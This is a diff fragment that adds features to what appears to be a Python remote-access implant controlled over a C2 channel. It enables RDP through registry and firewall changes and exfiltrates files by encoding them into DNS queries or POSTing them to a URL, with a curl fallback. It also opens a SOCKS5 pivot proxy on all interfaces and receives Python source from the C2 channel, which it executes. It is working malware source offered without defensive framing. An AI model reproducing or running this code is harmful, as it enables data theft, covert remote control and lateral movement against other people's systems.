+        return "[-] ssh not found on this system"
+    cmd = f"ssh -o StrictHostKeyChecking=no -o BatchMode=yes -p {port} {user}@{host} id 2>&1"
+    return _shell_exec(cmd)
+
+
+@_register("rdp_enable")
+def _rdp_enable(conn, args: list[str]) -> str:
+    if sys.platform != "win32":
+        return "[-] RDP enable is Windows-only"
+    results = []
+    cmds = [
+        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" "
+        "/v fDenyTSConnections /t REG_DWORD /d 0 /f 2>&1",
+        "netsh advfirewall firewall add rule name=\"Allow RDP\" "
+        "protocol=TCP dir=in localport=3389 action=allow 2>&1",
+        "net start TermService 2>&1",
+    ]
+    for cmd in cmds:
+        results.append(_shell_exec(cmd).strip()[:80])
+    return "\n".join(results)
+
+
+# ---------------------------------------------------------------------------
+# Exfiltration
+# ---------------------------------------------------------------------------
+
+@_register("exfil_dns")
+def _exfil_dns(conn, args: list[str]) -> str:
+    if len(args) < 2:
+        return "Usage: exfil_dns <file_path> <domain>"
+    path, domain = args[0], args[1]
+    if not os.path.isfile(path):
+        return f"[-] Not found: {path}"
+    try:
+        import base64, socket as _sock
+        with open(path, "rb") as fh:
+            data = fh.read()
+        encoded = base64.b32encode(data).decode().rstrip("=")
+        chunk_size = 50   # safe DNS label length
+        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
+        sent = 0
+        for i, chunk in enumerate(chunks):
+            label = f"{i}.{chunk.lower()}.{domain}"
+            try:
+                _sock.getaddrinfo(label, None)
+            except OSError:
+                pass   # expected — server-side resolver captures the query
+            sent += 1
+        return f"[+] Exfiltrated via DNS: {sent} chunks × {chunk_size} chars → {domain}"
+    except Exception as e:
+        return f"[-] exfil_dns: {e}"
+
+
+@_register("exfil_http")
+def _exfil_http(conn, args: list[str]) -> str:
+    if len(args) < 2:
+        return "Usage: exfil_http <file_path> <url>"
+    path, url = args[0], args[1]
+    if not os.path.isfile(path):
+        return f"[-] Not found: {path}"
+    # Try urllib first (stdlib), then curl/wget
+    try:
+        import urllib.request
+        with open(path, "rb") as fh:
+            data = fh.read()
+        req = urllib.request.Request(url, data=data, method="POST")
+        with urllib.request.urlopen(req, timeout=30) as resp:
+            code = resp.getcode()
+        return f"[+] Uploaded to {url}  (HTTP {code})"
+    except Exception as e1:
+        # Fallback to curl
+        if shutil.which("curl"):
+            r = _shell_exec(f'curl -s -X POST --data-binary @{path} "{url}" 2>&1')
+            return r or f"[+] curl upload to {url}"
+        return f"[-] exfil_http: {e1}"
+
+
+# ---------------------------------------------------------------------------
+# SOCKS5 proxy server on the agent
+# ---------------------------------------------------------------------------
+
+_socks5_servers: dict[int, object] = {}   # port → server socket
+
+@_register("socks5")
+def _socks5_start(conn, args: list[str]) -> str:
+    port = int(args[0]) if args and args[0].isdigit() else 1080
+    if port in _socks5_servers:
+        return f"[-] SOCKS5 already running on port {port}"
+    try:
+        _launch_socks5_server(port)
+        return f"[+] SOCKS5 proxy listening on 0.0.0.0:{port}"
+    except Exception as e:
+        return f"[-] socks5: {e}"
+
+
+def _launch_socks5_server(port: int) -> None:
+    import socket as _sock
+    srv = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+    srv.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
+    srv.bind(("0.0.0.0", port))
+    srv.listen(10)
+    _socks5_servers[port] = srv
+
+    def _accept_loop():
+        while port in _socks5_servers:
+            try:
+                client, addr = srv.accept()
+            except OSError:
+                break
+            threading.Thread(target=_handle_socks5_client, args=(client,), daemon=True).start()
+
+    threading.Thread(target=_accept_loop, daemon=True).start()
+
+
+def _handle_socks5_client(client) -> None:
+    """SOCKS5 server implementation (RFC 1928, no-auth only)."""
+    import socket as _sock
+    import struct as _struct
+    try:
+        # Greeting
+        header = client.recv(2)
+        if len(header) < 2:
+            client.close(); return
+        n_methods = header[1]
+        client.recv(n_methods)
+        # Accept no-auth (method 0x00)
+        client.sendall(b"\x05\x00")
+
+        # Request
+        req = client.recv(4)
+        if len(req) < 4 or req[0] != 5:
+            client.close(); return
+        cmd, _, atyp = req[1], req[2], req[3]
+
+        if atyp == 1:    # IPv4
+            raw = client.recv(4)
+            dest_addr = _sock.inet_ntoa(raw)
+        elif atyp == 3:  # Domain name
+            length = client.recv(1)[0]
+            dest_addr = client.recv(length).decode("utf-8", errors="replace")
+        elif atyp == 4:  # IPv6
+            raw = client.recv(16)
+            dest_addr = _sock.inet_ntop(_sock.AF_INET6, raw)
+        else:
+            client.close(); return
+
+        dest_port = _struct.unpack("!H", client.recv(2))[0]
+
+        if cmd != 1:  # Only CONNECT supported
+            client.sendall(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
+            client.close(); return
+
+        try:
+            remote = _sock.create_connection((dest_addr, dest_port), timeout=10)
+        except OSError:
+            client.sendall(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")
+            client.close(); return
+
+        # Success reply
+        client.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
+
+        def _relay(src, dst):
+            try:
+                while True:
+                    data = src.recv(4096)
+                    if not data:
+                        break
+                    dst.sendall(data)
+            except OSError:
+                pass
+            finally:
+                for s in (src, dst):
+                    try: s.close()
+                    except OSError: pass
+
+        threading.Thread(target=_relay, args=(client, remote), daemon=True).start()
+        threading.Thread(target=_relay, args=(remote, client), daemon=True).start()
+
+    except Exception:
+        try: client.close()
+        except OSError: pass
+
+
+# ---------------------------------------------------------------------------
+# Staged payload receiver  (Stage 1 bootstrap)
+# ---------------------------------------------------------------------------
+
+@_register("load_stage")
+def _load_stage(conn, args: list[str]) -> str:
+    """
+    Receive a Python code payload from the C2 channel and exec() it.
+    This is the agent-side handler for the stage-1 loader.
+    The payload arrives as a single message containing Python source.
+    """
+    try:
+        code = recv_msg(conn)   # wait for stage-1 source
+        exec(compile(code, "<stage1>", "exec"), {"conn": conn, "__name__": "__stage1__"})
+        return "[+] Stage 1 loaded and executed"
+    except Exception as e:
+        return f"[-] load_stage: {e}"
+
+
+
+
+# ---------------------------------------------------------------------------
 # Forkbomb (kept as dangerous/novelty)
 # ---------------------------------------------------------------------------
 
